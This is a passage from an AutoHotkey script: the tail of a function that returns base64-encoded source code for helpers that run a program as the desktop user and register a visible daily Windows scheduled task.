XYlICE9IC0xICYmIERsbENhbGwoIkNsb3NlSGFuZGxlIiwgUHRyLCAldiUpICkNCiAgIGlmIGVycm9yDQogICAgICB0aHJvdyBFeGNlcHRpb24oZXJyb3IpDQogICBSZXR1cm4gUElEDQp9DQoNClNoZWxsUnVuQXNVc2VyKGZpbGVQYXRoLCBhcmd1bWVudHMgOj0gIiIsIGRpcmVjdG9yeSA6PSAiIiwgdmVyYiA6PSAib3BlbiIsIHNob3cgOj0gMSkNCnsNCiAgIHN0YXRpYyBWVF9VSTQgOj0gMHgxMywgU1dDX0RFU0tUT1AgOj0gMHg4DQogICBzaGVsbFdpbmRvd3MgOj0gQ29tT2JqQ3JlYXRlKCJTaGVsbC5BcHBsaWNhdGlvbiIpLldpbmRvd3MNCiAgIHNoZWxsIDo9IHNoZWxsV2luZG93cy5JdGVtKCBDb21PYmplY3QoVlRfVUk0LCBTV0NfREVTS1RPUCkgKS5Eb2N1bWVudC5BcHBsaWNhdGlvbg0KICAgc2hlbGwuU2hlbGxFeGVjdXRlKGZpbGVQYXRoLCBhcmd1bWVudHMsIGRpcmVjdG9yeSwgdmVyYiwgc2hvdykNCn0NCg0KT25DaGlsZE1lc3NhZ2UoSW5mbywgd3ApIHsNCiAgIE1zZ0JveCwgJSB3cA0KICAgSW5mb1sxXSA6PSB3cA0KfQ0KDQpDcmVhdGVUYXNrKHRhc2tOYW1lLCBmaWxlUGF0aCwgc0FyZ3MsIHN0YXJ0VGltZSwgaW50ZXJ2YWxIb3VycyA6PSAwLCBzdGFydEltbWVkaWF0ZWx5IDo9IGZhbHNlKSB7DQogICBsb2NhbA0KICAgc3RhdGljIFRBU0tfVFJJR0dFUl9EQUlMWSA6PSAyDQogICAgICAgICwgVEFTS19BQ1RJT05fRVhFQyA6PSAwDQogICAgICAgICwgVEFTS19DUkVBVEVfT1JfVVBEQVRFIDo9IDYNCiAgICAgICAgLCBUQVNLX0xPR09OX0lOVEVSQUNUSVZFX1RPS0VOIDo9IDMNCiAgICAgICAgDQogICBpZiAhUmVnRXhNYXRjaChzdGFydFRpbWUsICJeKD86MHwxfCgyKSkoPygxKVswLTNdfFxkKTpbMC01XVxkJCIpDQogICAgICB0aHJvdyAid3Jvbmcgc3RhcnRUaW1lIGZvcm1hdCINCiAgIGlmICFzZXJ2aWNlIDo9IENvbU9iakNyZWF0ZSgiU2NoZWR1bGUuU2VydmljZSIpDQogICAgICBSZXR1cm4gZmFsc2UNCiAgIHNlcnZpY2UuQ29ubmVjdCgpDQogICByb290Rm9sZGVyIDo9IHNlcnZpY2UuR2V0Rm9sZGVyKCJcIikNCiAgIHRhc2tEZWZpbml0aW9uIDo9IHNlcnZpY2UuTmV3VGFzaygwKQ0KICAgDQogICBwcmluY2lwYWwgOj0gdGFza0RlZmluaXRpb24uUHJpbmNpcGFsDQogICBwcmluY2lwYWwuTG9nb25UeXBlIDo9IFRBU0tfTE9HT05fSU5URVJBQ1RJVkVfVE9LRU4NCiAgIA0KICAgc2V0dGluZ3MgOj0gdGFza0RlZmluaXRpb24uU2V0dGluZ3MNCiAgIHNldHRpbmdzLkVuYWJsZWQgOj0gdHJ1ZQ0KICAgc2V0dGluZ3MuU3RhcnRXaGVuQXZhaWxhYmxlIDo9IHRydWUNCiAgIHNldHRpbmdzLkRpc2FsbG93U3Rh"
base64 .= "cnRJZk9uQmF0dGVyaWVzIDo9IGZhbHNlDQogICBzZXR0aW5ncy5SdW5Pbmx5SWZOZXR3b3JrQXZhaWxhYmxlIDo9IHRydWUNCiAgIHNldHRpbmdzLkhpZGRlbiA6PSBmYWxzZQ0KDQogICB0cmlnZ2VycyA6PSB0YXNrRGVmaW5pdGlvbi5UcmlnZ2Vycw0KICAgdHJpZ2dlciA6PSB0cmlnZ2Vycy5DcmVhdGUoVEFTS19UUklHR0VSX0RBSUxZKQ0KICAgaWYgaW50ZXJ2YWxIb3VycyB7DQogICAgICByZXBldGl0aW9uIDo9IHRyaWdnZXIuUmVwZXRpdGlvbg0KICAgICAgcmVwZXRpdGlvbi5EdXJhdGlvbiA6PSAiUDFEIg0KICAgICAgcmVwZXRpdGlvbi5JbnRlcnZhbCA6PSAiUFQiIC4gaW50ZXJ2YWxIb3VycyAuICJIIg0KICAgfQ0KICAgc3RhcnRUaW1lIDo9ICIyMDIyMDYxNiIgLiBTdHJSZXBsYWNlKHN0YXJ0VGltZSwgIjoiKSAuICIwMCINCiAgIEZvcm1hdFRpbWUsIHN0YXJ0VGltZSwgJSBzdGFydFRpbWUsIHl5eXktTU0tZGRUSEg6bW06c3MNCiAgIHRyaWdnZXIuU3RhcnRCb3VuZGFyeSA6PSBzdGFydFRpbWUNCiAgIHRyaWdnZXIuSWQgOj0gIlRpbWVUcmlnZ2VySWQiDQogICB0cmlnZ2VyLkVuYWJsZWQgOj0gdHJ1ZQ0KDQogICBhY3Rpb24gOj0gdGFza0RlZmluaXRpb24uQWN0aW9ucy5DcmVhdGUoIFRBU0tfQUNUSU9OX0VYRUMgKQ0KICAgYWN0aW9uLlBhdGggOj0gZmlsZVBhdGgNCiAgIChzQXJncyAhPSAiIiAmJiBhY3Rpb24uQXJndW1lbnRzIDo9IHNBcmdzKQ0KICAgDQogICB0YXNrIDo9IHJvb3RGb2xkZXIuUmVnaXN0ZXJUYXNrRGVmaW5pdGlvbih0YXNrTmFtZSwgdGFza0RlZmluaXRpb24sIFRBU0tfQ1JFQVRFX09SX1VQREFURSwsLCBUQVNLX0xPR09OX0lOVEVSQUNUSVZFX1RPS0VOKQ0KICAgKCBzdGFydEltbWVkaWF0ZWx5ICYmIHRhc2suUnVuKCIiKSApDQogICBSZXR1cm4gdHJ1ZQ0KfQ=="
Return base64
}
